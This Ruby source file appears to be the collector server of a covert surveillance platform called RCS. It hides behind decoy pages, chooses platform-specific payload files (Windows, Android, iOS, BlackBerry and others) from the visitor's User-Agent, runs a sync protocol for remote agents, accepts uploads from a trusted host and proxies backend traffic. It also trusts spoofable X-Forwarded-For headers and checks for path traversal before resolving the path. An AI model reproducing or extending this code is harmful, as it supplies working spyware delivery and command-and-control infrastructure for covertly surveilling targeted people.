
require_relative 'protocol'

require 'rcs-common/mime'

require 'resolv'
require 'socket'

module RCS
module Collector

class CollectorController < RESTController
  
  def get
    # serve the requested file
    return http_get_file(@request[:headers], @request[:uri])
  rescue Exception => e
    return decoy_page
  end
  
  def put
    # only the DB is authorized to send PUT commands
    unless from_db? @request[:peer] then
      trace :warn, "HACK ALERT: #{@request[:peer]} is trying to send PUT [#{@request[:uri]}] commands!!!"
      return decoy_page
    end
    
    # this is a request to save a file in the public dir
    return http_put_file @request[:uri], @request[:content] unless @request[:uri].start_with?('/RCS-NC_')

    # otherwise is a request to push to a NC element
    content, content_type = NetworkController.push(@request[:uri].split('_')[1], @request[:content])
    return ok(content, {content_type: content_type})
  end

  def post
    # get the peer ip address if it was forwarded by a proxy
    peer = http_get_forwarded_peer(@request[:headers]) || @request[:peer]
    # the REST protocol for synchronization
    content, content_type, cookie = Protocol.parse peer, @request[:uri], @request[:cookie], @request[:content]
    return decoy_page if content.nil?
    return ok(content, {content_type: content_type, cookie: cookie})
  end

  def head
    # we abuse this method to implement a proxy for the backend
    # every request received are forwarded externally like a proxy

    # only the DB is authorized to send HEAD commands
    unless from_db? @request[:peer] then
      trace :warn, "HACK ALERT: #{@request[:peer]} is trying to send HEAD [#{@request[:uri]}] commands!!!"
      return decoy_page
    end

    return proxy_request(@request)
  end

  #
  # HELPERS
  #

  # returns the content of a file in the public directory
  def http_get_file(headers, uri)

    # retrieve the Operating System and app specific extension of the requester
    os, ext = http_get_os(headers)

    trace :info, "[#{@request[:peer]}][#{os}] GET public request #{uri}"

    # no automatic index
    return decoy_page if uri.eql? '/'
    
    # search the file in the public directory, and avoid exiting from it
    file_path = Dir.pwd + PUBLIC_DIR + uri
    return decoy_page unless file_path.start_with? Dir.pwd + PUBLIC_DIR

    # complete the request of the client
    file_path = File.realdirpath(file_path)

    # if the file is not present
    if not File.file?(file_path)
      # appent the extension for the arch of the requester
      arch_specific_file = uri + ext

      if File.file?(file_path + ext)
        trace :info, "[#{@request[:peer]}][#{os}] redirected to: #{arch_specific_file}"
        return http_redirect arch_specific_file
      end
    end

    return decoy_page unless File.file?(file_path)

    content_type = MimeType.get(file_path)

    trace :info, "[#{@request[:peer]}][#{os}] serving #{file_path} (#{File.size(file_path)}) #{content_type}"

    # trick for windows, eventmachine stream file does not work for file < 16Kb
    return ok(File.binread(file_path), {:content_type => content_type}) if File.size(file_path) < 16384

    return stream_file(File.realdirpath(file_path))
  end

  def http_redirect(file)
    body =  "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">"
    body += "<html><head>"
    body += "<title>302 Found</title>"
    body += "</head><body>"
    body += "<h1>Found</h1>"
    body += "<p>The document has moved <a href=\"#{file}\">here</a>.</p>"
    body += "</body></html>"
    return redirect(body, {location: file})
  end

  # return the content of the X-Forwarded-For header
  def http_get_forwarded_peer(headers)
    # extract the XFF
    headers.keep_if { |val| val['X-Forwarded-For:']}
    xff = headers.first
    # no header
    return nil if xff.nil?
    # remove the x-forwarded-for: part
    xff.slice!(0..16)
    # split the peers list
    peers = xff.split(',')
    trace :info, "[#{@request[:peer]}] has forwarded the connection for [#{peers.first}]"
    # we just want the first peer that is the original one
    return peers.first
  end

  # save a file in the /public directory
  def http_put_file(uri, content)
    begin
      # split the path in all the subdir and the filename
      dirs = uri.split('/').keep_if {|x| x.length > 0}
      file = dirs.pop
      if dirs.length == 0 then
        File.open(Dir.pwd + PUBLIC_DIR + '/' + file, 'wb') { |f| f.write content }
      else
        # create all the subdirs
        path = Dir.pwd + PUBLIC_DIR
        dirs.each do |d|
          path += '/' + d
          Dir.mkdir(path)
        end
        #TODO: when the file manager will be implemented
        # don't overwrite the file
        #raise "File already exists" if File.exist?(path + '/' + file)
        # and then the file
        File.open(path + '/' + file, 'wb') { |f| f.write content }
      end
    rescue Exception => e
      return server_error(e.message, {content_type: 'text/html'})
    end

    return ok('OK', {content_type: 'text/html'})
  end

  # returns the operating system of the requester
  def http_get_os(headers)
    # extract the user-agent
    headers.keep_if { |val| val['User-Agent:']}
    user_agent = headers.first

    return 'unknown', '' if user_agent.nil?

    trace :debug, "[#{@request[:peer]}] #{user_agent}"
    
    # return the correct type and extension
    return 'osx', '.app' if user_agent['MacOS'] or user_agent['Macintosh']
    return 'ios', '.ipa' if user_agent['iPhone'] or user_agent['iPad'] or user_agent['iPod']
    return 'winmo', '.cab' if user_agent['Windows CE']
    # windows must be after winmo
    return 'windows', '.exe' if user_agent['Windows']
    return 'blackberry', '.jad' if user_agent['BlackBerry']
    return 'android', '.apk' if user_agent['Android']
    # linux must be after android
    return 'linux', '.bin' if user_agent['Linux'] or user_agent['X11']
    return 'symbian', '.sisx' if user_agent['Symbian']

    return 'unknown', ''
  end

  def proxy_request(request)
    # split the request to create the real proxied request
    # the format is:  /METHOD/host/url
    params = request[:uri].split('/')
    params.shift
    method = params.shift
    host = params.shift
    url = '/' + params.join('/')
    url += '?' + request[:query] if request[:query]

    trace :debug, "Proxying (#{method}): host: #{host} url: #{url}"
    http = Net::HTTP.new(host, 80)

    case method
      when 'GET'
        resp = http.get(url)
      when 'POST'
        resp = http.post(url, request[:content])
    end

    return server_error(resp.body) unless resp.kind_of? Net::HTTPSuccess
    return ok(resp.body, {content_type: 'text/html'})
  end

  def from_db?(request_ip)
    # from localhost is ok
    return true if request_ip.eql? '127.0.0.1'
    # if the address is already an ip
    return true if request_ip.eql? Config.instance.global['DB_ADDRESS']
    # check if its from local
    return true if request_ip.eql? IPSocket.getaddress(Socket.gethostname)
    # otherwise resolve it
    begin
      return true if request_ip.eql? Resolv::DNS.new.getaddress(Config.instance.global['DB_ADDRESS']).to_s
    rescue Exception => e
      trace :warn, "Cannot resolve #{Config.instance.global['DB_ADDRESS']}: #{e.message}"
    end
    
    return false
  end

end # RCS::Controller::CollectorController

end # RCS::Controller
end # RCS